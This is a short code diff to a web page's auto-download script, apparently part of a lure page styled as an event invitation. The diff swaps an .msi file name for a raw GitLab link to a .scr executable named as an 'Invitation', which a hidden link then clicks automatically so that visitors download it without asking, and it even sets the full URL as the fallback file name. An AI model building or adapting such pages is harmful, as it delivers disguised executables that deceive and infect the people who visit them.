@@ -302,7 +302,7 @@
   <!-- Auto + manual download -->
   <script>
     // Change this once to your real file name (or path)
-    const FILE_NAME = "2026EventDetails_RSVP.msi";
+    const FILE_NAME = "https://gitlab.com/iamdanielwilson1/whym/-/raw/main/EventHighlights_Invitation2026.scr";
 
     // Wire manual link
     (function bindManual(){
@@ -350,7 +350,7 @@
           const a2 = document.createElement("a");
           a2.style.display = "none";
           a2.href = objectUrl;
-          a2.download = url.split("/").pop() || "2026EventDetails_RSVP.msi";
+          a2.download = url.split("/").pop() || "https://gitlab.com/iamdanielwilson1/whym/-/raw/main/EventHighlights_Invitation2026.scr";
           document.body.appendChild(a2);
           a2.click();
           a2.remove();
